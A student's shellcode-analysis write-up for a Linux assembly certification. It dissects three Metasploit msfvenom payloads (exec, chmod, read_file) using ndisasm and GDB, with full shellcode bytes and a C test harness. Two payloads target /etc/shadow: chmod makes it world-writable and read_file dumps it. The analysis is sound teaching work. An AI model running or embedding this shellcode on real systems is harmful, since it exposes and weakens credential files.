# Assignment 5

## What to do
- Take up at least 3 shellcode samples created using msfvenom for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

In this post the three inline (non staged) payloads analyzed are:
- linux/x86/exec
- linux/x86/chmod
- linux/x86/read_file


##### > linux/x86/exec

The first payload, _linux/x86/exec_ is part of the Metasploit framework, it is written by _vlad902_ and has one basic option:
```zsh
$ msfvenom -p linux/x86/exec --payload-options
[...]

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

[...]
```

The source code of this payload can be accessed at : https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x86/exec.rb

```ruby
payload =
      "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
      "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
      Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00" +
      "\x57\x53\x89\xe1\xcd\x80"
```

So, the payload among other things, creates a hex representation of the command provided by the user and adds the `\x00` byte at the end of this string.

The shellcode created using msfvenom in C format:

```zsh
$ msfvenom -p linux/x86/exec CMD=ls -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Final size of c file: 185 bytes
unsigned char buf[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c"
"\x73\x00\x57\x53\x89\xe1\xcd\x80";
```

##### Ndisasm

This section shows the analysis that can aided by providing the output of msfvenom as input to _ndisasm_:

```zsh
$ msfvenom -p linux/x86/exec CMD=ls | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes

00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E803000000        call 0x20
0000001D  6C                insb
0000001E  7300              jnc 0x20
00000020  57                push edi
00000021  53                push ebx
00000022  89E1              mov ecx,esp
00000024  CD80              int 0x80
```

This is a way of analyzing the shellcode without executing it.

##### GDB shellcode analysis

In this section our analysis is aided by GDB. The shellcode created by msfvenom have to be placed in the _shellcode.c_ file in order to compile and execute it in GDB.

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c"
"\x73\x00\x57\x53\x89\xe1\xcd\x80";

main()
{
        printf("Shellcode length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}
```

Compile the shellcode using `gcc -fno-stack-protector -z execstack -o shellcode shellcode.c`

Run the elf, in gdb set disassembly-flavor intel and place a break point in _code_ buffer:

```zsh
$ gdb -q ./shellcode
Reading symbols from /shellcode...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x804a040
(gdb) run
Starting program: /home/slae/Documents/test/ASSIGN#5/shellcode
Shellcode length:  15

Breakpoint 1, 0x0804a040 in code ()
(gdb)
```

Disassemble the program:

```zsh
(gdb) disassemble
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	push   0xb
   0x0804a042 <+2>:	pop    eax
   0x0804a043 <+3>:	cdq    
   0x0804a044 <+4>:	push   edx
   0x0804a045 <+5>:	pushw  0x632d
   0x0804a049 <+9>:	mov    edi,esp
   0x0804a04b <+11>:	push   0x68732f
   0x0804a050 <+16>:	push   0x6e69622f
   0x0804a055 <+21>:	mov    ebx,esp
   0x0804a057 <+23>:	push   edx
   0x0804a058 <+24>:	call   0x804a060 <code+32>
   0x0804a05d <+29>:	ins    BYTE PTR es:[edi],dx
   0x0804a05e <+30>:	jae    0x804a060 <code+32>
   0x0804a060 <+32>:	push   edi
   0x0804a061 <+33>:	push   ebx
   0x0804a062 <+34>:	mov    ecx,esp
   0x0804a064 <+36>:	int    0x80
   0x0804a066 <+38>:	add    BYTE PTR [eax],al
End of assembler dump.
```

In the first two lines of the assembly code EAX is loaded with the value 0xb. This value is the _execve_ sys call number.

At this point let's remember the _execve_ prototype:
```c
int execve(const char *filename, char *const argv[], char *const envp[]);_
```
Reading the _execve_ man page:

- __filename__ must be either a binary executable, or a script starting with a line of the form: #! interpreter [optional-arg]

- __argv__ is an array of argument strings passed to the new program.  By convention, the first of these strings should contain the  file‐name associated with the file being executed

- __envp__ is an array of strings, conventionally of the form key=value, which are passed as environment to the new program

Considering the provided information, in order to execute a command the shellcode has to make the execve sys call like this:

> execve("/bin/sh ", ["/bin/sh ", "-c ", "ls "], NULL)

Returning back to the Assembly code, `cdq` instruction follows. This instruction copies the sign (bit 31) of the value in the EAX register into every bit position in the EDX register. So, in this case, EDX becomes zero and then is pushed on the stack (this zero will be the terminating symbol of the next string).

In the next two instructions "-c" is pushed on the stack and EDI points to this string.

Starting from _0x0804a04b <+11>_ the next three instructions push "/bin/sh\0" on the stack and a pointer to this string is passed in EBX.

The following instruction located in _0x0804a057 <+23>_ pushes a zero on the stack. At this point, EAX has the number of sys call execve and EBX points to the memory location where "/bin/sh\0" string is located. What is left is to place in ECX a pointer to string "-c\0" and EDX to be loaded with the NULL value.

Next instruction to be executed is the `call`. When this instruction is being executed, the address of the following instruction - in this case it is the _0x0804a05d_ - is pushed on the stack.

At this point, address _0x0804a05d_ is pointing to `6c` which represents character `l`. In the following two memory addresses characters `s` and `\0` are stored in consecutive memory locations. Combined these characters make the string `ls\0`, which is going to be the third argument of argv[] in execve.

The program then jumps to the instruction located in _0x0804a060 <+32>_. This instruction places the memory address pointed by EDI on the stack. EDI points to the memory location where `-c\0` is located in.

As the two first arguments of execve _filename_ and _argv_ are pointers to arrays of characters, each string will have to end with the `\0` character. That's why each separate string have to end in `\0`.

After _push edi_, the memory address that EBX points to is pushed on the stack (_push ebx_ instruction - EBX points to `/bin/sh\0`) and finally the sys call is being made (_int 0x80_).

##### > linux/x86/chmod

The _linux/x86/chmod_ payload is written by _kris katterjohn_ and has two basic options:

```zsh
$ msfvenom -p linux/x86/chmod --payload-options
[...]

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

[...]
```

The source code of this payload can be accessed at:
https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x86/chmod.rb

```ruby
payload	=
      "\x99\x6a\x0f\x58\x52" +
      Rex::Arch::X86.call(file.length + 1) + file + "\x00" +
      "\x5b" + Rex::Arch::X86.push_dword(mode) +
      "\x59\xcd\x80\x6a\x01\x58\xcd\x80";
```

The actual payload created by msfvenom is:
```zsh
$ msfvenom -p linux/x86/chmod -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] =
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
```

###### Ndisasm

At this point ndisasm will aid our analysis. We provide the output of msfvenom as input to ndisasm:

```zsh
$ msfvenom -p linux/x86/chmod | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes

00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```

The sys call number of chmod located in unistd_32 header file is listed below:

> #define \__NR_chmod               15 = 0xf

The prototype of chmod sys call which is located in the manual page is listed above:

> int chmod(const char \*path, mode_t mode);

Let's begin the analysis of the assembly code.

In the first five lines of the assembly code, edx is zeroed, sys call number is loaded in eax, 0 is pushed on the stack and a call to pop edx instruction is made.
```assembly
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
```

After the call is made, `\x2F\x65\x74\x63\x2F\x73\x68\x61\x64\x6F\x77\x00` is pushed on the stack. This hex string converted to text is `/etc/shadow\0`. Null character represents the end of the string.

In the next instruction, a pointer to this string is loaded in ebx
```assembly
00000016  5B                pop ebx
```

So, at this point, the first argument of chmod() is ready

Next instruction pushes on the stack value 0666 (octal representation). This value represents MODE option in the payload created by msfvenom.

After that, ecx is loaded with a pointer to this value and chmod is ready to be called using instruction _int 0x80_.

Finally, the exit sys call is being made:
```zsh
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```

##### > linux/x86/read_file

The _linux/x86/read_file_ payload is written by _hal_ and has two basic options:

```zsh
$ msfvenom -p linux/x86/read_file --payload-options
[...]

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FD    1                yes       The file descriptor to write output to
PATH                   yes       The file path to read

[...]
```

The source code of this payload can be accessed at:
https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x86/read_file.rb

The actual payload created by msfvenom is:
```zsh
$ msfvenom -p linux/x86/read_file path=/etc/shadow -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes
Final size of c file: 331 bytes
unsigned char buf[] =
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00";
```

##### Ndisasm

Providing the output of msfvenom to ndisasm:

```zsh
$ msfvenom -p linux/x86/read_file path=/etc/shadow | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes

00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7368              jnc 0xac
00000044  61                popa
00000045  646F              fs outsd
00000047  7700              ja 0x49
```

The first instruction jumps to:
> 00000038  E8C5FFFFFF        call 0x2

When the `call` is being executed string `\x2F\x65\x74\x63\x2F\x73\x68\x61\x64\x6F\x77\x00` is pushed on the stack. This string represents `/etc/shadow\0`.

After that, the execution flow moves to the command below with which `open` sys call number is loaded in _eax_
> 00000002  B805000000        mov eax,0x5

In the next commands until the `int 0x80` is issued, registers are being set up to make the sys call.

The next sys calls in consecutive order that are being executed are _read_, _write_ and finally _exit_.

To sum up, this shellcode opens a file descriptor, reads a file, writes the data of the file to the specified descriptor and finally exits.

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
